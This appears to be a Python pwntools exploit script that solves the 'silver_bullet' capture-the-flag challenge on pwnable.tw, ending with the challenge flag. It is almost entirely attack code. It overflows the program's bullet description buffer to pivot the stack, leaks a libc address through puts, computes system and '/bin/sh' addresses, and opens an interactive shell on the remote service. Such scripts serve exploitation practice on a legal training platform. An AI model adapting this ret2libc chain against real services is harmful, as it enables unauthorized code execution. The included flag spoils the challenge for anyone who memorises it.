from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./silver_bullet')
	stdin_offset = 0x1b25a0
	system_offset = 0x03ada0
	binsh_offset = 0x15ba0b 
else:
	host, port = "chall.pwnable.tw", 10103
	r = remote(host, port)
	libc = ELF('./libc_32.so.6')
	stdin_offset = libc.symbols['_IO_2_1_stdin_']
	system_offset = libc.symbols['system']
	binsh_offset = next(libc.search('/bin/sh'))

raw_input('debug')

main_add = 0x08048954
read_int = 0x0804864F
puts = 0x08048949
new_ebp = 0x804bc50
r.sendlineafter("Your choice :", "1")
payload = 'a'*0x2f
r.sendafter("Give me your description of bullet :", 'a'*0x2f)
r.sendlineafter("Your choice :", "2")
r.sendafter("Give me your another description of bullet :", "c")
r.sendlineafter("Your choice :", "2")
payload = '\x80\x70\x80' + p32(new_ebp) + p32(read_int) + p32(new_ebp)
r.sendafter("Give me your another description of bullet :", payload)
r.sendlineafter("Your choice :", "3")
r.recvuntil("Oh ! You win !!")

payload = p32(new_ebp + 0xc) + p32(puts)
payload += p32(0x804b020) + p32(new_ebp + 0x4c)
payload += p32(read_int) + p32(new_ebp + 0x50) + p32(0x90)

r.sendline(payload)

r.recv(1)
res = r.recv(4)
stdin_add = u32(res)
libc_base = stdin_add - stdin_offset
log.info("libc_base = %#x " %libc_base)
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset

payload = p32(system_add) + 'aaaa' + p32(binsh_add)
r.sendline(payload)

r.interactive()
r.close()
# FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}